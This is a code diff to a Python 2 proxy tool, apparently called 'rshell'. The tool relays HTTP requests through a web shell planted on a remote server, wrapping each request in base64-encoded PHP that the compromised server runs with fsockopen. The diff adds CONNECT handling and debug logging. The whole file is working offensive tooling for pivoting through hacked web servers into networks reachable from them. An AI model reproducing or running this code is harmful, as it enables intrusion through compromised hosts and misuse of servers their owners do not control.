@@ -20,66 +20,86 @@ No response from server
 
 class ReqHandler(asyncore.dispatcher_with_send):
 
+    incomplete_request = None
+
     def __init__(self, sock, sh_url):
         asyncore.dispatcher_with_send.__init__(self, sock)
         self.sh_url = sh_url
 
     def handle_read(self):
-        try:
+        #try:
             data = self.recv(8192)
             if data:
                 response = self.forward_request(data)
                 if response:
-                    self.send(response)
-                else:
-                    self.send(nf_404)
-        except:
-            pass
+                    if response.startswith("HTTP/1.0 200 Connection established"):
+                        self.send(response)
+                        # TODO: HTTPS Connection
+                        try:
+                            data = self.recv(8192)
+                        except:
+                            pass
+                    else:
+                        self.send(response)
+                #else:
+                #    self.send(nf_404)
+        #except:
+        #    pass
+        #print "bye"
 
     def forward_request(self, data):
         if data:
             lines = data.split("\r\n")
             l1 = lines[0]
-            (method, url, version) = l1.split()
-            parsed_url = urlparse(url)
-            if parsed_url.hostname:
-                if parsed_url.query:
-                    path_query = "{0}?{1}".format(parsed_url.path,
-                                                  parsed_url.query)
-                else:
-                    path_query = parsed_url.path
-                rb_request = "{0} {1} {2}\r\n".format(method,
-                                                      path_query,
-                                                      version)
-                headers_str = "\r\n".join(lines[1:])
-                #Works better closing http connection
-                headers_str = headers_str.replace("Connection: keep-alive",
-                                                  "Connection: close")
-                b64_request = encodestring("{0}{1}".format(rb_request,
-                                                           headers_str))
-                port = parsed_url.port if parsed_url.port else 80
-                #PHP code to run in the server
-                php_code = """$fp = fsockopen('{0}', {1}, $errno, $errstr, 5);
-                              fwrite($fp, base64_decode('{2}'));
-                              while (!feof($fp)) {{ echo fgets($fp, 2048); }};
-                              fclose($fp);"""
-                php_code = php_code.format(parsed_url.hostname,
-                                           port,
-                                           b64_request.replace(os.linesep, ""))
-                b64_php_code = "param={0}".format(encodestring(php_code))
-                b64_php_code = b64_php_code.replace(os.linesep, "")
-                response = request.do_request(self.sh_url,
-                                              b64_php_code,
-                                              None)
-                if response:
-                    return response
+            if l1.startswith("CONNECT "):
+                return "HTTP/1.0 200 Connection established\r\nProxy-agent: rshell 0.1\r\n\r\n"
+            try:
+                (method, url, version) = l1.split()
+
+                parsed_url = urlparse(url)
+                if parsed_url.hostname:
+                    if parsed_url.query:
+                        path_query = "{0}?{1}".format(parsed_url.path,
+                                                      parsed_url.query)
+                    else:
+                        path_query = parsed_url.path
+                    rb_request = "{0} {1} {2}\r\n".format(method,
+                                                          path_query,
+                                                          version)
+                    headers_str = "\r\n".join(lines[1:])
+                    # Works better closing http connection
+                    headers_str = headers_str.replace("Connection: keep-alive",
+                                                      "Connection: close")
+                    b64_request = encodestring("{0}{1}".format(rb_request,
+                                                               headers_str))
+                    port = parsed_url.port if parsed_url.port else 80
+                    # PHP code to run in the server
+                    php_code = """$fp = fsockopen('{0}', {1}, $errno, $errstr, 5);
+                                  fwrite($fp, base64_decode('{2}'));
+                                  while (!feof($fp)) {{ echo fgets($fp, 2048); }};
+                                  fclose($fp);"""
+                    php_code = php_code.format(parsed_url.hostname,
+                                               port,
+                                               b64_request.replace(os.linesep, ""))
+                    b64_php_code = "param={0}".format(encodestring(php_code))
+                    b64_php_code = b64_php_code.replace(os.linesep, "")
+                    response = request.do_request(self.sh_url,
+                                                  b64_php_code,
+                                                  None)
+                    if response:
+                        return response
+            except:
+                print data
         return None
 
 
 class ReqServer(asyncore.dispatcher):
 
-    def __init__(self, host, port, sh_url):
+    debug = None
+
+    def __init__(self, host, port, sh_url, debug):
         asyncore.dispatcher.__init__(self)
+        self.debug = debug
         self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
         self.set_reuse_addr()
         self.bind((host, port))
@@ -90,19 +110,26 @@ class ReqServer(asyncore.dispatcher):
         pair = self.accept()
         if pair is not None:
             sock, addr = pair
+            if self.debug:
+                print "Connection from {0}".format(repr(addr))
             handler = ReqHandler(sock, self.sh_url)
 
 
 class Proxy(Process):
     host = 'localhost'
     port = 8888
+    debug = None
+    sh_url = None
+
+    def set_debug(self, deb):
+        self.debug = deb
 
     def set_shell_url(self, sh_url):
         self.sh_url = sh_url
 
     def run(self):
-        #print "Starting proxy on port {0}".format(self.port)
-        server = ReqServer(self.host, self.port, self.sh_url)
+        # print "Starting proxy on port {0}".format(self.port)
+        server = ReqServer(self.host, self.port, self.sh_url, self.debug)
         asyncore.loop()
 
 
